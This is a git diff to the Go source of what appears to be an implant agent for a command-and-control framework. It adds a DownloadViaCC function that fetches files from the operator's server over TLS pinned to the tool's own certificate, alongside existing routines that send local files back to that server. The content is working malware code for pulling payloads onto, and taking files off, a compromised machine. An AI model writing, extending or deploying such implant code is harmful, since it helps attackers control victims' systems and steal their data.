@@ -2,12 +2,18 @@ package agent
 
 import (
 	"bufio"
+	"crypto/tls"
+	"crypto/x509"
 	"encoding/base64"
 	"fmt"
+	"io/ioutil"
 	"log"
+	"net/http"
 	"os"
 	"time"
 
+	"github.com/cavaliercoder/grab"
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -37,6 +43,55 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 
 	// send
 	return checksum, Send2CC(&fileData)
+}
+
+// DownloadViaCC download via EmpHTTPClient
+// if path is empty, return []data instead
+func DownloadViaCC(url, path string) (data []byte, err error) {
+	log.Printf("DownloadViaCC is downloading from %s to %s", url, path)
+	retData := false
+	if path == "" {
+		retData = true
+		path = fmt.Sprintf("%s/%s", os.TempDir(), uuid.NewString())
+	}
+
+	// use EmpHTTPClient
+	// start with an empty pool
+	rootCAs := x509.NewCertPool()
+
+	// add our cert
+	if ok := rootCAs.AppendCertsFromPEM(tun.CACrt); !ok {
+		log.Println("No certs appended")
+	}
+
+	// Trust the augmented cert pool in our client
+	config := &tls.Config{
+		InsecureSkipVerify: false,
+		RootCAs:            rootCAs,
+	}
+
+	// return our http client
+	tr := &http.Transport{TLSClientConfig: config}
+	client := grab.NewClient()
+	client.HTTPClient.Transport = tr // use our TLS transport
+
+	req, err := grab.NewRequest(path, url)
+	if err != nil {
+		err = fmt.Errorf("Create grab request: %v", err)
+		return
+	}
+	resp := client.Do(req)
+	if retData {
+		data, err = ioutil.ReadFile(path)
+		return
+	}
+	for resp.Progress() < 1 {
+		log.Printf("%f %% downloaded\n", resp.Progress()*100)
+		time.Sleep(time.Second)
+	}
+
+	log.Printf("DownloadViaCC: saved %s to %s (%d bytes)", url, path, resp.Size)
+	return
 }
 
 // sendFile2CC send file to CC, with buffering
@@ -85,7 +140,6 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 			buf = make([]byte, 0)
 			continue
 		}
-		// fmt.Printf("%x", scanner.Bytes())
 	}
 	if len(buf) > 0 && len(buf) < 1024*8 {
 		_, err = conn.Write(buf)
